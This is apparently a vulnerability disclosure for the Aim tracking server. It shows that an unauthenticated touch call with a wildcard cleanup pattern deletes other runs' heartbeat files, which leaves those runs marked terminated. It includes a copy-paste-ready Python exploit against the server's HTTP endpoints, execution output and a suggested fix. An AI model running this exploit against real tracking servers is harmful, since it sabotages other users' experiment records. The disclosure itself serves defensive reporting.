# Aim tracking server: unauthenticated `FileManager.touch` with client-controlled cleanup pattern deletes other runs' heartbeats

**Upstream issue:** https://github.com/aimhubio/aim/issues/3423

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2 Ubuntu 24.04 against a real `aim server`; output below is from the actual run)

## Reproduction conditions

- aim 3.29.1 (pip), Python 3.11, Ubuntu 24.04
- A running `aim server --repo <path>` with default settings (binds `0.0.0.0:53800`, **no authentication**)
- At least one victim run with heartbeat files under `<repo>/.aim/check_ins/` (any live tracking client produces these)

## Description

`LocalFileManager._cleanup(pattern)` in `aim/sdk/reporter/file_manager.py` globs the **shared** `<repo>/.aim/check_ins` directory and unlinks every match except the lexicographically largest one — no per-run/per-client ownership filter:

```python
def _cleanup(self, pattern: str) -> Path:
    *paths_to_remove, max_path = sorted(self.base_dir.glob(pattern))
    for path in paths_to_remove:
        path.unlink()
```

`touch(filename, cleanup_file_pattern)` is exposed over the tracking server's `read-instruction` dispatch with a fully client-controlled `cleanup_file_pattern` (e.g. `*`).

Heartbeat files are the liveness input for run status: `RunStatusManager._is_run_stalled` (`aim/sdk/run_status_manager.py`) treats a run with no heartbeat files as stalled (the `else: stalled = True` branch), and `_mark_run_terminated` then sets `end_time` and removes the progress marker.

## Impact

An unauthenticated network client of the tracking server can delete the heartbeat check-ins of *other, still-active* runs; the monitoring process then marks those runs as terminated — an integrity/availability attack against a shared tracking server.

## PoC (copy-paste ready)

**Step 1 — victim environment** (heartbeats of a live run exist):

```
<repo>/.aim/check_ins/deadbeef00000000deadbeef0000000-0-progress-0-1699999990
<repo>/.aim/check_ins/deadbeef00000000deadbeef0000000-1-progress-0-1699999991
<repo>/.aim/check_ins/deadbeef00000000deadbeef0000000-2-progress-0-1699999992
```

**Step 2 — attacker** (any host that can reach the server; uses aim's own codecs):

```python
import base64, requests
from aim.ext.transport.message_utils import pack_args
from aim.storage.treeutils import encode_tree

BASE = "http://<server>:53800/tracking/poc-attacker"
fm = requests.post(f"{BASE}/get-resource/",
                   json={"resource_handler": "", "resource_type": "FileManager",
                         "args": base64.b64encode(b"").decode()}).json()["handler"]

# filename sorts LAST, so every real heartbeat is in the "all but max" removal set
requests.post(f"{BASE}/read-instruction/",
              json={"resource_handler": fm, "method_name": "touch",
                    "args": base64.b64encode(
                        pack_args(encode_tree(("zzz-attacker-max", "*")))).decode()})
```

## Execution result (actual run: aim 3.29.1 / Python 3.11 / Ubuntu 24.04)

```
[evidence] heartbeats before attack: ['deadbeef00000000deadbeef0000000-0-progress-0-1699999990',
                                       'deadbeef00000000deadbeef0000000-1-progress-0-1699999991',
                                       'deadbeef00000000deadbeef0000000-2-progress-0-1699999992']
[attacker] touch('zzz-attacker-max', '*') -> HTTP 200
[evidence] heartbeats after attack: ['zzz-attacker-max']
[RESULT-A] REPRODUCED - all victim heartbeats deleted, only attacker file remains
```

All three victim heartbeat files were unlinked by a single unauthenticated call; per `run_status_manager.py`, a run with no heartbeat files is evaluated as stalled and gets terminated.

## Suggested fix

Scope both the glob and the touch to the calling run's own heartbeat prefix (derive it server-side from the run identity), and never accept a raw cleanup pattern from the client.
